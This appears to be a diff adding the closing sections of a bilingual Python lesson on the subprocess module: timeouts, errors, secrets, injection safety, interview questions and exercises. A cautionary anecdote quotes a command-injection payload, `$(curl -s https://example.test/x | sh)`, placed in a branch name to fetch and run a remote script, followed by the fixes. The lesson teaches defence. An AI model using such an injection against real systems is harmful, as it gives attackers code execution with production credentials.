+- `subprocess.run([...], capture_output=True, text=True, check=True, timeout=...)` mehfooz default hai.
+- `FileNotFoundError`, `CalledProcessError` aur `TimeoutExpired` alag alag sambhalein.
+- Bahar ke data se kabhi shell strings na banayen; lists injection se bachati, aur `shlex.quote` aakhri chara hai.
+- `cwd` aur `env` qaboo karein; secrets arguments ke taur par na dein.
+- Streaming aur pipelines ke liye `Popen` lein, aur machine ke parhne layak output formats ko tarjeeh dein.
+
+</Ur>
+</Tr>
+</Takeaways>
+
+## Go deeper
+
+<Tr>
+<En>
+The sections below are for when you're comfortable with the basics, or getting ready for interviews.
+</En>
+<Ur>
+Neeche ke hisse tab ke liye hain jab basics achi tarah samajh aa jayen, ya interview ki tayyari ho.
+</Ur>
+</Tr>
+
+<DeepDive title="More about subprocess">
+
+**Async subprocesses.** `asyncio.create_subprocess_exec` runs many commands concurrently without threads.
+
+**Large outputs.** Redirect to files (`stdout=open("out.log", "wb")`) or stream with `Popen` instead of capturing gigabytes in memory.
+
+**Process groups and signals.** `start_new_session=True` and `os.killpg` let you stop a command and all its children; `proc.terminate()` sends SIGTERM, `proc.kill()` SIGKILL.
+
+**Windows differences.** Some commands are shell built-ins on Windows (`dir`); program names may need `.exe`; `shlex` follows POSIX rules.
+
+**Higher-level libraries.** `sh` and `plumbum` offer friendlier syntax; `fabric` and `paramiko` run commands over SSH.
+
+</DeepDive>
+
+<DeepDive title="Real world: the CI job that deployed a branch name">
+
+An internal deploy tool ran `subprocess.run(f"git checkout {branch} && ./deploy.sh", shell=True)` with the branch name taken from a chat command. A tester typed a "branch" containing `$(curl -s https://example.test/x | sh)`. The shell evaluated it, and the script from that URL ran on the deploy server with access to production credentials. Fortunately it was a harmless proof of concept.
+
+The fixes:
+
+1. Lists instead of shell strings, with `--` before the branch argument.
+2. Branch names validated against an allow-list pattern and checked with `git rev-parse --verify`.
+3. The deploy runner was given the minimum credentials it needed, and its outbound network access was restricted.
+
+</DeepDive>
+
+<DeepDive title="Security lens">
+
+- **Command injection (CWE-78)**: never combine `shell=True` with untrusted data; use argument lists.
+- **Argument injection**: values starting with `-` can become options; validate them and put `--` before positional values.
+- **Secrets**: pass them via environment or stdin, not arguments visible in `ps`; scrub them from logged commands.
+- **Minimal environment**: give child processes only the variables they need.
+- **Full paths for sensitive tools** in privileged scripts, so a malicious program earlier on PATH can't be run instead.
+
+</DeepDive>
+
+<DeepDive title="Interview questions">
+
+<QA q="What's the difference between subprocess.run with a list and with shell=True?">
+With a list, the program is executed directly and each item is one argument, so special characters have no meaning; with shell=True a shell parses the string, enabling pipes and variables but also command injection if any part is untrusted.
+</QA>
+
+<QA q="How do you handle a command that might hang?">
+Pass timeout to run or communicate; catch TimeoutExpired, log it and fail or retry, and for process trees consider killing the whole process group.
+</QA>
+
+<QA q="What does check=True do?">
+It makes run raise CalledProcessError when the command exits with a non-zero status, so failures aren't silently ignored.
+</QA>
+
+<QA q="When would you use Popen instead of run?">
+When you need to interact with the process while it runs: streaming output, connecting pipelines between processes, sending input incrementally or managing long-lived processes.
+</QA>
+
+<QA q="How do you safely pass a secret to a subprocess?">
+Through an environment variable or stdin rather than a command-line argument, with a minimal environment, making sure it isn't logged.
+</QA>
+
+</DeepDive>
+
+<DeepDive title="All key terms">
+
+<Terms>
+  <Term name="subprocess">Module for running external programs.</Term>
+  <Term name="subprocess.run">Runs a command and waits for it.</Term>
+  <Term name="Popen">Low-level process interface.</Term>
+  <Term name="Child process">Process started by another.</Term>
+  <Term name="Return code">Exit status of a process.</Term>
+  <Term name="stdout">Standard output stream.</Term>
+  <Term name="stderr">Standard error stream.</Term>
+  <Term name="check">Option raising on failure.</Term>
+  <Term name="CalledProcessError">Raised for non-zero exit with check.</Term>
+  <Term name="TimeoutExpired">Raised when a timeout passes.</Term>
+  <Term name="shell=True">Runs the command through a shell.</Term>
+  <Term name="Command injection">Running attacker-controlled commands.</Term>
+  <Term name="shlex">Shell-style quoting and splitting.</Term>
+  <Term name="shutil.which">Finds a program on PATH.</Term>
+  <Term name="Pipe">Connection between process streams.</Term>
+</Terms>
+
+</DeepDive>
+
+<DeepDive title="More practice">
+
+1. Write a function that returns `docker ps` output as a list of dicts using `--format '{{json .}}'`.
+2. Run three `ping -c 1` commands in parallel with `asyncio.create_subprocess_exec`.
+3. Stream `pip install` output live and stop it after a timeout.
+4. Rewrite a bash backup script in Python with proper error handling.
+5. Find every `shell=True` in a codebase and decide whether each one is safe.
+
+</DeepDive>
+
+Next: **Calling APIs with requests and httpx**: talking to web services with timeouts, retries and authentication.
